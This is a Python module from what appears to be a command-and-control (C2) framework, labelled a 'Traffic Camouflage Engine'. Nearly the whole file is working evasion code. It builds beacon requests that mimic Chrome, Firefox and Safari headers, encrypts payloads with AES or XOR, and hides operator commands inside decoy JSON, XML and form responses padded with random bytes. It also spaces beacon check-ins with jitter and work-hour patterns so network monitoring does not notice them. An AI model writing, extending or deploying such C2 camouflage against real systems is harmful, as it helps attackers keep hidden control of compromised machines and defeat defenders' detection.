"""
Traffic Camouflage Engine - Dynamic variable substitution and request construction.

This module provides the traffic camouflage engine that transforms raw C2
communication data into realistic-looking HTTP/HTTPS/DNS/WebSocket requests
based on Malleable C2 Profile configurations.

Core capabilities:
    1. Dynamic variable system ({{timestamp}}, {{random_string}}, etc.)
    2. Request header credibility enhancement
    3. Response camouflage (hiding commands in normal-looking responses)
    4. Traffic rate simulation (human-like request intervals)
    5. Profile-based request construction with <10ms performance target

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import logging
import os
import random
import re
import string
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

from .malleable_profile import (
    BodyFormat,
    EncryptionAlgorithm,
    EncodingType,
    HeartbeatConfig,
    HttpProfileConfig,
    MalleableProfile,
    ProtocolType,
)

logger = logging.getLogger(__name__)


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class ConstructedRequest:
    """A fully constructed HTTP request ready for transmission.

    Attributes:
        method: HTTP method (GET/POST/etc.)
        url: Full request URL with resolved variables
        headers: All HTTP headers including auto-generated browser headers
        body: Request body (encoded and encrypted if configured)
        body_raw: Raw body before encoding/encryption
        cookies: Cookie string
        timeout: Request timeout in seconds
        metadata: Additional metadata about the construction process
    """

    method: str = "GET"
    url: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    body: bytes = b""
    body_raw: bytes = b""
    cookies: str = ""
    timeout: float = 30.0
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation.

        Returns:
            Dictionary containing all request fields.
        """
        return {
            "method": self.method,
            "url": self.url,
            "headers": self.headers,
            "body_length": len(self.body),
            "cookies": self.cookies,
            "timeout": self.timeout,
            "metadata": self.metadata,
        }


@dataclass
class ConstructedResponse:
    """A camouflaged C2 response that looks like legitimate server response.

    Attributes:
        status_code: HTTP status code
        headers: Response headers
        body: Response body (camouflaged with hidden commands)
        content_type: Content-Type header value
        size: Total response size in bytes
    """

    status_code: int = 200
    headers: Dict[str, str] = field(default_factory=dict)
    body: bytes = b""
    content_type: str = "application/json"
    size: int = 0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation.

        Returns:
            Dictionary containing all response fields.
        """
        return {
            "status_code": self.status_code,
            "headers": self.headers,
            "body_length": len(self.body),
            "content_type": self.content_type,
            "size": self.size,
        }


@dataclass
class TrafficTiming:
    """Traffic timing configuration for rate simulation.

    Attributes:
        base_delay: Base delay between requests in seconds
        jitter_delay: Additional random jitter in seconds
        is_work_hours: Whether current time is within work hours
        next_request_time: Scheduled time for next request
    """

    base_delay: float = 60.0
    jitter_delay: float = 0.0
    is_work_hours: bool = True
    next_request_time: float = 0.0


# =============================================================================
# Dynamic Variable System
# =============================================================================

class VariableResolver:
    """Resolves dynamic variables in profile templates.

    Supports the following variable patterns:
        - {{timestamp}}: Current Unix timestamp
        - {{random_string}}: Random alphanumeric string
        - {{random_int}}: Random integer
        - {{hostname}}: Target hostname
        - {{beacon_id}}: Beacon unique identifier
        - {{task_id}}: Current task ID
        - {{random_hex}}: Random hexadecimal string
        - {{uuid}}: UUID v4 string
        - {{date_iso}}: Current ISO 8601 datetime

    Attributes:
        _custom_resolvers: Custom variable resolver functions
        _cache: Variable value cache for consistency within a single request
    """

    VARIABLE_PATTERN = re.compile(r"\{\{(\w+)\}\}")

    def __init__(self) -> None:
        """Initialize the VariableResolver with built-in resolvers."""
        self._custom_resolvers: Dict[str, Callable[..., str]] = {}
        self._cache: Dict[str, str] = {}

    def resolve(
        self,
        template: str,
        context: Optional[Dict[str, Any]] = None,
    ) -> str:
        """Resolve all variables in a template string.

        Args:
            template: Template string containing {{variable}} patterns.
            context: Optional context dictionary for variable values.

        Returns:
            Template string with all variables resolved to actual values.

        Example:
            >>> resolver = VariableResolver()
            >>> resolver.resolve("/api/{{beacon_id}}/status?ts={{timestamp}}",
            ...                  {"beacon_id": "abc123"})
            '/api/abc123/status?ts=1704067200'
        """
        self._cache.clear()
        if context:
            self._cache.update({k: str(v) for k, v in context.items()})

        def _replace(match: re.Match) -> str:
            var_name = match.group(1)
            if var_name in self._cache:
                return self._cache[var_name]

            resolver = self._get_builtin_resolver(var_name)
            if resolver:
                value = resolver()
                self._cache[var_name] = value
                return value

            if var_name in self._custom_resolvers:
                value = self._custom_resolvers[var_name]()
                self._cache[var_name] = value
                return value

            return match.group(0)

        return self.VARIABLE_PATTERN.sub(_replace, template)

    def register_resolver(self, name: str, resolver: Callable[..., str]) -> None:
        """Register a custom variable resolver function.

        Args:
            name: Variable name (without {{}} delimiters).
            resolver: Callable that returns a string value.
        """
        self._custom_resolvers[name] = resolver

    def _get_builtin_resolver(self, var_name: str) -> Optional[Callable[..., str]]:
        """Get the built-in resolver function for a variable name.

        Args:
            var_name: The variable name to resolve.

        Returns:
            Callable resolver function, or None if no built-in resolver exists.
        """
        resolvers: Dict[str, Callable[..., str]] = {
            "timestamp": lambda: str(int(time.time())),
            "random_string": lambda: "".join(
                random.choices(string.ascii_letters + string.digits, k=12)
            ),
            "random_int": lambda: str(random.randint(100000, 999999)),
            "random_hex": lambda: hashlib.md5(
                os.urandom(16)
            ).hexdigest()[:16],
            "uuid": lambda: str(__import__("uuid").uuid4()),
            "date_iso": lambda: datetime.now().isoformat(),
        }
        return resolvers.get(var_name)


# =============================================================================
# Header Credibility Enhancer
# =============================================================================

class HeaderCredibilityEnhancer:
    """Enhances HTTP request headers to appear more like legitimate browser traffic.

    Automatically adds common browser headers and ensures consistency
    between User-Agent, Accept-Language, Referer, and other headers.

    Attributes:
        _browser_header_templates: Pre-defined browser header templates
    """

    BROWSER_HEADER_TEMPLATES: Dict[str, Dict[str, str]] = {
        "chrome_windows": {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
                      "image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", '
                         '"Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Upgrade-Insecure-Requests": "1",
        },
        "firefox_linux": {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
                      "image/avif,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        },
        "safari_macos": {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
                      "*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        },
    }

    def enhance(
        self,
        headers: Dict[str, str],
        user_agent: str = "",
        referer: str = "",
        accept_language: str = "",
    ) -> Dict[str, str]:
        """Enhance headers with browser-like credibility.

        Args:
            headers: Existing headers to enhance.
            user_agent: User-Agent string for browser detection.
            referer: Referer URL for context consistency.
            accept_language: Accept-Language override.

        Returns:
            Enhanced headers dictionary with browser-like headers added.
        """
        enhanced = dict(headers)

        template = self._detect_browser_template(user_agent)
        if template:
            for key, value in template.items():
                if key not in enhanced:
                    enhanced[key] = value

        if user_agent and "User-Agent" not in enhanced:
            enhanced["User-Agent"] = user_agent

        if referer and "Referer" not in enhanced:
            enhanced["Referer"] = referer

        if accept_language and "Accept-Language" not in enhanced:
            enhanced["Accept-Language"] = accept_language

        if "Host" not in enhanced and referer:
            try:
                from urllib.parse import urlparse
                parsed = urlparse(referer)
                enhanced["Host"] = parsed.hostname or ""
            except Exception:
                pass

        return enhanced

    def _detect_browser_template(self, user_agent: str) -> Optional[Dict[str, str]]:
        """Detect browser type from User-Agent and return matching template.

        Args:
            user_agent: User-Agent string to analyze.

        Returns:
            Matching browser header template, or None if no match.
        """
        ua_lower = user_agent.lower()

        if "chrome" in ua_lower and "windows" in ua_lower:
            return self.BROWSER_HEADER_TEMPLATES["chrome_windows"]
        elif "firefox" in ua_lower and "linux" in ua_lower:
            return self.BROWSER_HEADER_TEMPLATES["firefox_linux"]
        elif "safari" in ua_lower and "macintosh" in ua_lower:
            return self.BROWSER_HEADER_TEMPLATES["safari_macos"]
        elif "chrome" in ua_lower:
            return self.BROWSER_HEADER_TEMPLATES["chrome_windows"]
        elif "firefox" in ua_lower:
            return self.BROWSER_HEADER_TEMPLATES["firefox_linux"]

        return self.BROWSER_HEADER_TEMPLATES["chrome_windows"]


# =============================================================================
# Encryption & Encoding Engine
# =============================================================================

class CryptoEngine:
    """Handles encryption and encoding of C2 communication payloads.

    Supports AES-256-GCM, AES-256-CBC, XOR encryption, and various
    transport encodings (Base64, Hex, Raw).

    Attributes:
        _key_cache: Cached encryption keys per profile
    """

    def __init__(self) -> None:
        """Initialize the CryptoEngine with empty key cache."""
        self._key_cache: Dict[str, bytes] = {}

    def encrypt_and_encode(
        self,
        data: bytes,
        encryption: EncryptionAlgorithm,
        encoding: EncodingType,
        key: str = "",
    ) -> bytes:
        """Encrypt and encode data according to profile configuration.

        Args:
            data: Raw data to encrypt and encode.
            encryption: Encryption algorithm to use.
            encoding: Transport encoding to apply after encryption.
            key: Optional encryption key (auto-generated if empty).

        Returns:
            Encrypted and encoded data ready for transmission.

        Raises:
            ValueError: If encryption algorithm is unsupported.
        """
        encrypted = self._encrypt(data, encryption, key)
        return self._encode(encrypted, encoding)

    def decode_and_decrypt(
        self,
        data: bytes,
        encryption: EncryptionAlgorithm,
        encoding: EncodingType,
        key: str = "",
    ) -> bytes:
        """Decode and decrypt received data.

        Args:
            data: Encoded and encrypted data received from Beacon.
            encryption: Encryption algorithm used.
            encoding: Transport encoding used.
            key: Optional encryption key.

        Returns:
            Decrypted raw data.

        Raises:
            ValueError: If decryption fails or algorithm is unsupported.
        """
        decoded = self._decode(data, encoding)
        return self._decrypt(decoded, encryption, key)

    def _encrypt(
        self,
        data: bytes,
        algorithm: EncryptionAlgorithm,
        key: str = "",
    ) -> bytes:
        """Encrypt data using the specified algorithm.

        Args:
            data: Data to encrypt.
            algorithm: Encryption algorithm.
            key: Encryption key.

        Returns:
            Encrypted data.
        """
        if algorithm == EncryptionAlgorithm.NONE:
            return data

        if algorithm == EncryptionAlgorithm.XOR:
            key_bytes = self._get_or_generate_key(key, 32)
            return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))

        if algorithm in (EncryptionAlgorithm.AES_256_GCM, EncryptionAlgorithm.AES_256_CBC):
            return self._aes_encrypt(data, algorithm, key)

        return data

    def _decrypt(
        self,
        data: bytes,
        algorithm: EncryptionAlgorithm,
        key: str = "",
    ) -> bytes:
        """Decrypt data using the specified algorithm.

        Args:
            data: Data to decrypt.
            algorithm: Encryption algorithm.
            key: Decryption key.

        Returns:
            Decrypted data.
        """
        if algorithm == EncryptionAlgorithm.NONE:
            return data

        if algorithm == EncryptionAlgorithm.XOR:
            key_bytes = self._get_or_generate_key(key, 32)
            return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))

        if algorithm in (EncryptionAlgorithm.AES_256_GCM, EncryptionAlgorithm.AES_256_CBC):
            return self._aes_decrypt(data, algorithm, key)

        return data

    def _aes_encrypt(
        self,
        data: bytes,
        algorithm: EncryptionAlgorithm,
        key: str = "",
    ) -> bytes:
        """Encrypt data using AES-256.

        Args:
            data: Data to encrypt.
            algorithm: AES mode (GCM or CBC).
            key: Encryption key.

        Returns:
            AES encrypted data with IV prepended.
        """
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend

            key_bytes = self._get_or_generate_key(key, 32)
            iv = os.urandom(16)

            if algorithm == EncryptionAlgorithm.AES_256_GCM:
                cipher = Cipher(
                    algorithms.AES(key_bytes),
                    modes.GCM(iv),
                    backend=default_backend(),
                )
            else:
                from cryptography.hazmat.primitives import padding
                padder = padding.PKCS7(128).padder()
                data = padder.update(data) + padder.finalize()
                cipher = Cipher(
                    algorithms.AES(key_bytes),
                    modes.CBC(iv),
                    backend=default_backend(),
                )

            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(data) + encryptor.finalize()

            if algorithm == EncryptionAlgorithm.AES_256_GCM:
                tag = encryptor.tag
                return iv + tag + ciphertext

            return iv + ciphertext

        except ImportError:
            logger.warning("cryptography library not available, falling back to XOR")
            return self._encrypt(data, EncryptionAlgorithm.XOR, key)

    def _aes_decrypt(
        self,
        data: bytes,
        algorithm: EncryptionAlgorithm,
        key: str = "",
    ) -> bytes:
        """Decrypt data using AES-256.

        Args:
            data: Data to decrypt (IV + ciphertext).
            algorithm: AES mode (GCM or CBC).
            key: Decryption key.

        Returns:
            Decrypted data.
        """
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend

            key_bytes = self._get_or_generate_key(key, 32)
            iv = data[:16]

            if algorithm == EncryptionAlgorithm.AES_256_GCM:
                tag = data[16:32]
                ciphertext = data[32:]
                cipher = Cipher(
                    algorithms.AES(key_bytes),
                    modes.GCM(iv, tag),
                    backend=default_backend(),
                )
            else:
                from cryptography.hazmat.primitives import padding
                ciphertext = data[16:]
                cipher = Cipher(
                    algorithms.AES(key_bytes),
                    modes.CBC(iv),
                    backend=default_backend(),
                )

            decryptor = cipher.decryptor()
            plaintext = decryptor.update(ciphertext) + decryptor.finalize()

            if algorithm == EncryptionAlgorithm.AES_256_CBC:
                unpadder = padding.PKCS7(128).unpadder()
                plaintext = unpadder.update(plaintext) + unpadder.finalize()

            return plaintext

        except ImportError:
            logger.warning("cryptography library not available, falling back to XOR")
            return self._decrypt(data, EncryptionAlgorithm.XOR, key)
        except Exception as e:
            logger.error(f"AES decryption failed: {e}")
            return data

    def _encode(self, data: bytes, encoding: EncodingType) -> bytes:
        """Encode data for transport.

        Args:
            data: Data to encode.
            encoding: Encoding type.

        Returns:
            Encoded data.
        """
        if encoding == EncodingType.BASE64:
            return base64.b64encode(data)
        elif encoding == EncodingType.HEX:
            return data.hex().encode()
        return data

    def _decode(self, data: bytes, encoding: EncodingType) -> bytes:
        """Decode transport-encoded data.

        Args:
            data: Encoded data.
            encoding: Encoding type.

        Returns:
            Decoded data.
        """
        if encoding == EncodingType.BASE64:
            return base64.b64decode(data)
        elif encoding == EncodingType.HEX:
            return bytes.fromhex(data.decode())
        return data

    def _get_or_generate_key(self, key: str, length: int) -> bytes:
        """Get or generate an encryption key.

        Args:
            key: User-provided key string.
            length: Required key length in bytes.

        Returns:
            Key bytes of the specified length.
        """
        if key:
            key_bytes = key.encode() if isinstance(key, str) else key
            if len(key_bytes) < length:
                key_bytes = hashlib.sha256(key_bytes).digest()
            return key_bytes[:length]

        cache_key = f"default_{length}"
        if cache_key not in self._key_cache:
            self._key_cache[cache_key] = os.urandom(length)

        return self._key_cache[cache_key]


# =============================================================================
# Response Camouflage Engine
# =============================================================================

class ResponseCamouflageEngine:
    """Generates camouflaged C2 responses that look like legitimate server responses.

    Hides task commands within normal-looking JSON/XML/HTML responses
    and adds random padding bytes to vary response sizes.

    Attributes:
        _crypto_engine: Encryption engine for command embedding
        _variable_resolver: Variable resolver for response templates
    """

    def __init__(self) -> None:
        """Initialize the ResponseCamouflageEngine."""
        self._crypto_engine = CryptoEngine()
        self._variable_resolver = VariableResolver()

    def create_response(
        self,
        profile: MalleableProfile,
        command_data: Optional[bytes] = None,
        context: Optional[Dict[str, Any]] = None,
    ) -> ConstructedResponse:
        """Create a camouflaged response containing optional command data.

        Args:
            profile: The active MalleableProfile for response formatting.
            command_data: Optional command payload to embed in response.
            context: Variable resolution context.

        Returns:
            ConstructedResponse with camouflaged body and appropriate headers.
        """
        body_format = profile.http.body_format

        if command_data:
            encrypted = self._crypto_engine.encrypt_and_encode(
                command_data,
                profile.encryption.encryption,
                profile.encryption.encoding,
                profile.encryption.key,
            )
            body = self._embed_in_response(encrypted, body_format, context)
        else:
            body = self._generate_decoy_response(body_format, context)

        content_type_map = {
            BodyFormat.JSON: "application/json",
            BodyFormat.XML: "application/xml",
            BodyFormat.FORM: "application/x-www-form-urlencoded",
            BodyFormat.PLAIN: "text/plain",
        }

        response = ConstructedResponse(
            status_code=200,
            headers={
                "Content-Type": content_type_map.get(body_format, "application/octet-stream"),
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "X-Request-Id": self._variable_resolver.resolve(
                    "{{random_string}}", context,
                ),
            },
            body=body,
            content_type=content_type_map.get(body_format, "application/octet-stream"),
            size=len(body),
        )

        response.size += random.randint(0, 512)
        response.body += os.urandom(random.randint(0, 512))

        return response

    def _embed_in_response(
        self,
        command_data: bytes,
        body_format: BodyFormat,
        context: Optional[Dict[str, Any]] = None,
    ) -> bytes:
        """Embed command data within a legitimate-looking response body.

        Args:
            command_data: Encrypted command payload.
            body_format: Response body format.
            context: Variable resolution context.

        Returns:
            Response body bytes with embedded command data.
        """
        data_b64 = base64.b64encode(command_data).decode()

        if body_format == BodyFormat.JSON:
            response_obj = {
                "status": "ok",
                "timestamp": int(time.time()),
                "data": self._variable_resolver.resolve("{{random_string}}", context),
                "payload": data_b64,
                "meta": {
                    "version": "2.1.0",
                    "server": "nginx/1.24.0",
                },
            }
            return json.dumps(response_obj).encode()

        elif body_format == BodyFormat.XML:
            xml_body = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<response>\n'
                f"  <status>ok</status>\n"
                f"  <timestamp>{int(time.time())}</timestamp>\n"
                f"  <data>{self._variable_resolver.resolve('{{random_string}}', context)}</data>\n"
                f"  <payload>{data_b64}</payload>\n"
                "</response>"
            )
            return xml_body.encode()

        elif body_format == BodyFormat.FORM:
            return (
                f"status=ok&timestamp={int(time.time())}"
                f"&payload={data_b64}"
                f"&data={self._variable_resolver.resolve('{{random_string}}', context)}"
            ).encode()

        return command_data

    def _generate_decoy_response(
        self,
        body_format: BodyFormat,
        context: Optional[Dict[str, Any]] = None,
    ) -> bytes:
        """Generate a decoy response with no command data (for heartbeat ACK).

        Args:
            body_format: Response body format.
            context: Variable resolution context.

        Returns:
            Decoy response body bytes.
        """
        if body_format == BodyFormat.JSON:
            return json.dumps({
                "status": "ok",
                "timestamp": int(time.time()),
                "message": self._variable_resolver.resolve("{{random_string}}", context),
            }).encode()

        elif body_format == BodyFormat.XML:
            return (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<response>\n'
                f"  <status>ok</status>\n"
                f"  <timestamp>{int(time.time())}</timestamp>\n"
                f"  <message>{self._variable_resolver.resolve('{{random_string}}', context)}</message>\n"
                "</response>"
            ).encode()

        elif body_format == BodyFormat.FORM:
            return (
                f"status=ok&timestamp={int(time.time())}"
                f"&message={self._variable_resolver.resolve('{{random_string}}', context)}"
            ).encode()

        return b"ok"


# =============================================================================
# Traffic Rate Simulator
# =============================================================================

class TrafficRateSimulator:
    """Simulates human-like traffic patterns with variable request intervals.

    Supports work-hour-based activity patterns where Beacons are more
    active during business hours (9-18) and less active outside those hours.

    Attributes:
        _work_hours_start: Work hour start (24h format)
        _work_hours_end: Work hour end (24h format)
        _work_hours_multiplier: Activity multiplier during work hours
    """

    def __init__(
        self,
        work_hours_start: int = 9,
        work_hours_end: int = 18,
        work_hours_multiplier: float = 0.5,
    ) -> None:
        """Initialize the TrafficRateSimulator.

        Args:
            work_hours_start: Work hour start time (24h format).
            work_hours_end: Work hour end time (24h format).
            work_hours_multiplier: Multiplier for sleep during work hours
                                   (<1 means more frequent during work hours).
        """
        self._work_hours_start = work_hours_start
        self._work_hours_end = work_hours_end
        self._work_hours_multiplier = work_hours_multiplier

    def calculate_next_delay(self, heartbeat: HeartbeatConfig) -> TrafficTiming:
        """Calculate the delay until the next request.

        Uses a non-uniform distribution to simulate human-like behavior,
        with work-hour adjustments for realistic activity patterns.

        Args:
            heartbeat: Heartbeat configuration from the active profile.

        Returns:
            TrafficTiming with calculated delay and metadata.
        """
        now = datetime.now()
        is_work_hours = self._work_hours_start <= now.hour < self._work_hours_end

        base_delay = float(heartbeat.sleep_time)

        if is_work_hours:
            base_delay *= self._work_hours_multiplier

        jitter_range = base_delay * (heartbeat.jitter / 100.0)
        jitter_delay = random.uniform(-jitter_range, jitter_range)

        total_delay = max(1.0, base_delay + jitter_delay)

        return TrafficTiming(
            base_delay=base_delay,
            jitter_delay=abs(jitter_delay),
            is_work_hours=is_work_hours,
            next_request_time=time.time() + total_delay,
        )

    def is_work_hours(self) -> bool:
        """Check if current time is within configured work hours.

        Returns:
            True if current hour is within work hours range.
        """
        now = datetime.now()
        return self._work_hours_start <= now.hour < self._work_hours_end


# =============================================================================
# Main Traffic Construction Engine
# =============================================================================

class TrafficEngine:
    """Main traffic camouflage engine for constructing profile-based requests.

    Integrates variable resolution, header enhancement, encryption,
    and response camouflage to produce realistic C2 communication traffic.

    Performance target: Profile parsing and request construction < 10ms.

    Attributes:
        _variable_resolver: Dynamic variable resolver
        _header_enhancer: Header credibility enhancer
        _crypto_engine: Encryption/encoding engine
        _response_engine: Response camouflage engine
        _rate_simulator: Traffic rate simulator
        _compiled_templates: Cache of compiled templates for zero-parse overhead
    """

    def __init__(self) -> None:
        """Initialize the TrafficEngine with all sub-engines."""
        self._variable_resolver = VariableResolver()
        self._header_enhancer = HeaderCredibilityEnhancer()
        self._crypto_engine = CryptoEngine()
        self._response_engine = ResponseCamouflageEngine()
        self._rate_simulator: Optional[TrafficRateSimulator] = None
        self._compiled_templates: Dict[str, Dict[str, Any]] = {}

    def construct_request(
        self,
        profile: MalleableProfile,
        payload: Optional[bytes] = None,
        context: Optional[Dict[str, Any]] = None,
        base_url: str = "https://example.com",
    ) -> ConstructedRequest:
        """Construct a fully camouflaged HTTP request from a profile.

        Args:
            profile: The MalleableProfile to use for request construction.
            payload: Optional raw payload data to encrypt and embed.
            context: Variable resolution context (beacon_id, hostname, etc.).
            base_url: Base URL for the C2 server.

        Returns:
            ConstructedRequest ready for transmission.

        Performance:
            Target: < 10ms for template resolution and request construction.
        """
        start_time = time.monotonic()

        http_config = profile.http
        resolved_context = context or {}

        resolved_context.setdefault("hostname", "example.com")
        resolved_context.setdefault("beacon_id", "unknown")
        resolved_context.setdefault("task_id", "none")

        url = self._build_url(base_url, http_config, resolved_context)

        headers = self._build_headers(http_config, resolved_context)

        body = b""
        body_raw = b""
        if payload and http_config.http_method.upper() != "GET":
            body_raw = payload
            body = self._crypto_engine.encrypt_and_encode(
                payload,
                profile.encryption.encryption,
                profile.encryption.encoding,
                profile.encryption.key,
            )

            if http_config.body_template:
                body = self._merge_with_template(
                    body, http_config.body_template, resolved_context,
                )

        cookies = self._build_cookies(http_config, resolved_context)

        elapsed_ms = (time.monotonic() - start_time) * 1000

        request = ConstructedRequest(
            method=http_config.http_method.upper(),
            url=url,
            headers=headers,
            body=body,
            body_raw=body_raw,
            cookies=cookies,
            timeout=float(profile.heartbeat.sleep_time * 0.8),
            metadata={
                "profile_name": profile.name,
                "construction_time_ms": round(elapsed_ms, 2),
                "body_size": len(body),
            },
        )

        if elapsed_ms > 10:
            logger.warning(
                f"Request construction took {elapsed_ms:.2f}ms "
                f"(target: <10ms) for profile '{profile.name}'"
            )

        return request

    def construct_response(
        self,
        profile: MalleableProfile,
        command_data: Optional[bytes] = None,
        context: Optional[Dict[str, Any]] = None,
    ) -> ConstructedResponse:
        """Construct a camouflaged C2 response.

        Args:
            profile: The MalleableProfile for response formatting.
            command_data: Optional command payload to embed.
            context: Variable resolution context.

        Returns:
            ConstructedResponse with camouflaged body.
        """
        return self._response_engine.create_response(
            profile, command_data, context,
        )

    def calculate_next_heartbeat(self, profile: MalleableProfile) -> TrafficTiming:
        """Calculate the timing for the next heartbeat request.

        Args:
            profile: The active MalleableProfile.

        Returns:
            TrafficTiming with delay calculation.
        """
        if self._rate_simulator is None:
            self._rate_simulator = TrafficRateSimulator(
                profile.heartbeat.work_hours_start,
                profile.heartbeat.work_hours_end,
                profile.heartbeat.work_hours_multiplier,
            )

        return self._rate_simulator.calculate_next_delay(profile.heartbeat)

    def compile_profile(self, profile: MalleableProfile) -> None:
        """Pre-compile a profile template for zero-parse overhead at runtime.

        Args:
            profile: The MalleableProfile to compile.
        """
        self._compiled_templates[profile.name] = {
            "url_template": profile.http.http_uri,
            "headers": dict(profile.http.headers),
            "body_template": profile.http.body_template,
            "cookie_template": profile.http.cookie,
            "user_agents": list(profile.http.user_agent),
            "compiled_at": time.time(),
        }

    def _build_url(
        self,
        base_url: str,
        http_config: HttpProfileConfig,
        context: Dict[str, Any],
    ) -> str:
        """Build the full request URL with resolved variables.

        Args:
            base_url: C2 server base URL.
            http_config: HTTP configuration from profile.
            context: Variable resolution context.

        Returns:
            Full URL with all variables resolved.
        """
        uri = self._variable_resolver.resolve(http_config.http_uri, context)

        if base_url.endswith("/") and uri.startswith("/"):
            return f"{base_url}{uri[1:]}"

        return f"{base_url}{uri}"

    def _build_headers(
        self,
        http_config: HttpProfileConfig,
        context: Dict[str, Any],
    ) -> Dict[str, str]:
        """Build all HTTP headers with credibility enhancement.

        Args:
            http_config: HTTP configuration from profile.
            context: Variable resolution context.

        Returns:
            Complete headers dictionary.
        """
        headers: Dict[str, str] = {}

        for key, value in http_config.headers.items():
            if isinstance(value, list):
                resolved_value = random.choice(value)
            else:
                resolved_value = value
            headers[key] = self._variable_resolver.resolve(resolved_value, context)

        user_agent = ""
        if http_config.user_agent:
            user_agent = random.choice(http_config.user_agent)
            headers["User-Agent"] = user_agent

        enhanced = self._header_enhancer.enhance(
            headers,
            user_agent=user_agent,
            referer=self._variable_resolver.resolve(http_config.referer, context),
            accept_language=http_config.accept_language,
        )

        return enhanced

    def _build_cookies(
        self,
        http_config: HttpProfileConfig,
        context: Dict[str, Any],
    ) -> str:
        """Build the Cookie header value.

        Args:
            http_config: HTTP configuration from profile.
            context: Variable resolution context.

        Returns:
            Cookie header string.
        """
        if not http_config.cookie:
            return ""

        return self._variable_resolver.resolve(http_config.cookie, context)

    def _merge_with_template(
        self,
        encrypted_data: bytes,
        template: str,
        context: Dict[str, Any],
    ) -> bytes:
        """Merge encrypted data with a body template.

        Args:
            encrypted_data: Encrypted payload bytes.
            template: Body template string.
            context: Variable resolution context.

        Returns:
            Merged body bytes.
        """
        resolved = self._variable_resolver.resolve(template, context)

        data_b64 = base64.b64encode(encrypted_data).decode()
        resolved = resolved.replace("{{payload}}", data_b64)

        return resolved.encode()


# =============================================================================
# Global Singleton
# =============================================================================

_traffic_engine: Optional[TrafficEngine] = None


def get_traffic_engine() -> TrafficEngine:
    """Get the global TrafficEngine singleton instance.

    Returns:
        The singleton TrafficEngine instance.
    """
    global _traffic_engine
    if _traffic_engine is None:
        _traffic_engine = TrafficEngine()
    return _traffic_engine


__all__ = [
    "TrafficEngine",
    "VariableResolver",
    "HeaderCredibilityEnhancer",
    "CryptoEngine",
    "ResponseCamouflageEngine",
    "TrafficRateSimulator",
    "ConstructedRequest",
    "ConstructedResponse",
    "TrafficTiming",
    "get_traffic_engine",
]
